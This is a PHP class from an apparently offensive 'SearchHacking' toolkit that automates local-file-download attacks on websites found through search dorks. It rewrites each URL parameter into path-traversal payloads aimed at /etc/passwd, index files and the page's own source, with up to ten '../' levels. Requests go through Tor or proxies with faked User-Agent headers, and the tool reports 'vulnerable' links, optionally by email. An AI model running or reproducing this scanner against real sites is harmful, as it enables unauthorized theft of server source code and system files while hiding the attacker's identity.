<?php
namespace Aszone\Component\SearchHacking\Lib\Vunerabilities;

use Respect\Validation\Validator as v;
use Aszone\Component\SearchHacking\Lib\FakeHeaders\FakeHeaders;
use GuzzleHttp\Client;

class LocalFileDownload
{
    public $targets;

    public $target;

    public $tor;

    public $commandData;

    public function __construct($commandData,$targets)
    {
        //Check command of entered.
        $defaultEnterData=$this->defaultEnterData();
        $this->commandData=array_merge($defaultEnterData,$commandData);
        if($this->commandData['torl']){
            $this->commandData['tor']=$this->commandData['torl'];
        }
        $this->targets=$targets;
    }

    private function defaultEnterData()
    {
        $dataDefault['dork']=false;
        $dataDefault['pl']=false;
        $dataDefault['tor']=false;
        $dataDefault['torl']=false;
        $dataDefault['virginProxies']=false;
        $dataDefault['proxyOfSites']=false;

        return $dataDefault;
    }

    public function check()
    {
        $result = [];
        foreach ($this->targets as $searchEngenier) {
            foreach ($searchEngenier as $keyTarget => $target) {
                $this->target=urldecode(urldecode($target));
                $result[] = $this->checkSuccess();
            }

        }

        return $result;
    }
    

    protected function getWordListInArray($wordlist)
    {
        $checkFileWordList = v::file()->notEmpty()->validate($wordlist);
        if ($checkFileWordList) {
            $targetResult = file($wordlist, FILE_IGNORE_NEW_LINES);
            return $targetResult;
        }

        return false;
    }

    protected function checkSuccess()
    {
        $isValidLfd=$this->isLfd($this->target);
        if(!$isValidLfd)
        {
            return false;
        }
        return $this->setVull();

    }

    protected function isLfd($target)
    {
        $validLfd = preg_match("/\?|(.+?)\=/",$target,$m);
        if($validLfd)
        {
            return true;
        }

        return false;
    }

    protected function setVull()
    {
        //$ext=$this->getExtension($this->target);
        $urlsForAttack=$this->generatesUrlForAttack();

        $resultcheckAttack=[];
        echo "\n";
        foreach($urlsForAttack as $urlAttack)
        {

            $resultcheckAttack=$this->setAttack($urlAttack);
            if(!empty($resultcheckAttack) AND $this->checkIsFileOfsystem($resultcheckAttack))
            {
                echo "Is Vull";
                return $urlAttack;
            }
        }
        return false;
    }

    protected function checkIsFileOfsystem($bodyFile)
    {

        $isValid=preg_match("/<%@|<%|<\?php|<\?=/",$bodyFile,$m);
        if($isValid)
        {
            return true;
        }
        return false;
    }

    protected function setAttack($url)
    {
        echo ".";
        $header=new FakeHeaders();
        $client 	= new Client(['defaults' => [
            'headers' => ['User-Agent' => $header->getUserAgent()],
            'proxy'   => $this->commandData['tor'],
            'timeout' => 30
            ]
        ]);
        try{
            return $client->get( $url )->getBody()->getContents();
        }
        catch(\Exception $e)
        {
            //echo "Error code => ".$e->getCode()."\n";
            echo "#";
        }
        return false;
    }

    protected function generatesUrlForAttack()
    {
        echo "\n".$this->target;
        $explodeUrl=parse_url($this->target);
        $ext=$this->getExtension();
        $urlFinal=[];
        $urlsIndex=$this->generateUrlsByExploit("index.".$ext);
        $urlsPath=$this->generateUrlsByExploit($explodeUrl['path']);
        $urlsEtc=$this->generateUrlsByExploit("etc/passwd");
        $urlFinal=array_merge($urlsPath,$urlsIndex,$urlsEtc);
        return $urlFinal;
    }

    protected function generateUrlsByExploit($exploit)
    {

        $explodeUrl=parse_url($this->target);
        $explodeQuery=explode("&",$explodeUrl['query']);

        //Identify and sets urls of values of Get
        foreach($explodeQuery as $keyQuery=> $query)
        {
            $explodeQueryEqual=explode("=",$query);
            $wordsValue[$keyQuery]=$explodeQueryEqual[1];
            //$wordsKey[$keyQuery]=$explodeQueryEqual[0];
        }
        foreach($explodeQuery as $keyQuery=> $query)
        {
            $queryUrl="";
            $preUrl=str_replace($wordsValue[$keyQuery],"??????????",$this->target);
            $urls[]=$preUrl;
            $explodePreUrl=parse_url($preUrl);
            $explodePreQuery=explode("&",$explodePreUrl['query']);
            foreach($explodePreQuery as $preQuery)
            {
                $explodePreQueryEqual=explode("=",$preQuery);
                if($explodePreQueryEqual[1]!="??????????")
                {
                    $queryUrl.=$explodePreQueryEqual[0]."=&";
                }
                else
                {
                    $queryUrl.=$explodePreQueryEqual[0]."=??????????&";
                }
            }
            $mountUrl=parse_url($preUrl);
            $queryUrl=substr($queryUrl,0, -1);
            $urls[]=$mountUrl["scheme"]."://".$mountUrl['host'].$mountUrl['path']."?".$queryUrl;

        }

        // Finish first find

        //Change ??? on value hacking
        $urlFinal=[];
        foreach($urls as $url)
        {

            $urlFinal[]=str_replace("??????????",$exploit,$url);

            //Url Of ResultPath
            $breakFolder="../";

            for($i=1;$i<=10;$i++)
            {
                $urlFinal[]=str_replace("??????????",$breakFolder.$exploit,$url);
                $breakFolder.="../";
            }
        }
        return $urlFinal;
    }

    protected function getNameFileUrl()
    {
        $resultUrl=parse_url($this->target);
        return $resultUrl['path'];

    }

    protected function getExtension()
    {
        $url_parts = parse_url($this->target);
        $isValidExt=preg_match("/\.(.*)/",$url_parts['path'],$m);
        if($isValidExt)
        {
            return $m[1];
        }
        return false;
    }

    protected function getKeysUrl($target)
    {
        $url_parts = parse_url($target);
        $parameters=explode("&",$url_parts['query']);
        $resultFinal=[];

        foreach($parameters as $keyGet=>$get)
        {
            $resultLine=explode("=",$get);
            $resultFinal[$keyGet][$resultLine[0]]= $resultLine[1];
        }

        return $resultFinal;
    }

    protected function sendMail($result)
    {
        //Send Mail with parcial results
        $mailer = new Mailer();
        if(empty($result)){
            $mailer->sendMessage('you@example.com',"Fail, not finder password in list. =\\");
        }else{
            $msg = "PHP Avenger Informer, SUCCESS:<br><br>Link Vull is ".$result;

            $mailer->sendMessage('you@example.com',$msg);
        }

    }

    protected function createNameFile()
    {
        return $this->getName().'_'.date('m-d-Y_hia');
    }

    protected function saveTxt($data,$filename)
    {
        $file=__DIR__."/../../../results/".$filename.".txt";
        $myfile = fopen($file, "w") or die("Unable to open file!");
        if(is_array($data)){
            foreach($data as $dataType)
            {
                foreach ($dataType as $singleData)
                {
                    $txt = $singleData."\n";
                    fwrite($myfile, $txt);
                }
            }
        }
        else
        {
            $txt = $data;
            fwrite($myfile, $txt);
        }
        fclose($myfile);

        if(!file_exists($file)){
            return false;
        }
        return true;

    }
}